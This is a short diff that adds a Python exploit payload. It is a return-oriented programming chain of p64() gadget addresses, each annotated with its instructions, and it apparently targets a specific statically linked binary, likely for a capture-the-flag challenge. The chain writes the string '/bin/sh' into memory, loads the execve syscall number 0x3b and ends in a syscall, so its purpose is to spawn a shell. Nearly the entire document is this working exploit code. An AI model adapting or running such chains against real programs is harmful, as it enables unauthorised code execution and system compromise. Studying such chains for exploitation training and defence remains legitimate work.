@@ -1,0 +1,35 @@
+payload = p64(0x406bd9)
+#0x0000000000406bd9: pop rbx; ret; 
+payload += p64(0x0)+p64(0x4073c8)
+# 0x00000000004073c8: pop rdi; pop rbp; ret; 
+payload += p64(0x4121ec)+p64(0x0)+p64(0x4087d4)
+# 0x00000000004087d4: mov eax, edi; ret; 
+payload += p64(0x4086e4)
+# 0x00000000004086e4: mov qword ptr [rax + 0x18], rbx; xor eax, eax; add rsp, 8; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x406bd9)
+# 0x0000000000406bd9: pop rbx; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x4073c8)
+# 0x00000000004073c8: pop rdi; pop rbp; ret; 
+payload += p64(0x412058)+p64(0x0)+p64(0x4087d4)
+# 0x00000000004087d4: mov eax, edi; ret; 
+payload += p64(0x4086e4)
+# 0x00000000004086e4: mov qword ptr [rax + 0x18], rbx; xor eax, eax; add rsp, 8; pop rbx; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4073c8)
+# 0x00000000004073c8: pop rdi; pop rbp; ret; 
+payload += p64(0x412204)+p64(0x0)+p64(0x4087d4)
+# 0x00000000004087d4: mov eax, edi; ret; 
+payload += p64(0x406bd9)
+# 0x0000000000406bd9: pop rbx; ret; 
+payload += p64(0x4121c0)+p64(0x407b16)
+# 0x0000000000407b16: imul edx, dword ptr [rax], 0x48; mov dword ptr [rbx + 0x18], 0; mov qword ptr [rbx + 0x20], 0; add rsp, 8; mov rax, rbx; pop rbx; pop rbp; pop r12; pop r13; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4073c6)
+# 0x00000000004073c6: pop rsi; pop r15; pop rbp; ret; 
+payload += p64(0x0)+p64(0x0)+p64(0x0)+p64(0x4073c8)
+# 0x00000000004073c8: pop rdi; pop rbp; ret; 
+payload += p64(0x3b)+p64(0x0)+p64(0x4087d4)
+# 0x00000000004087d4: mov eax, edi; ret; 
+payload += p64(0x4073c8)
+# 0x00000000004073c8: pop rdi; pop rbp; ret; 
+payload += p64(0x412070)+p64(0x0)+p64(0x406040)
+# 0x0000000000406040: syscall; 
+payload += b''
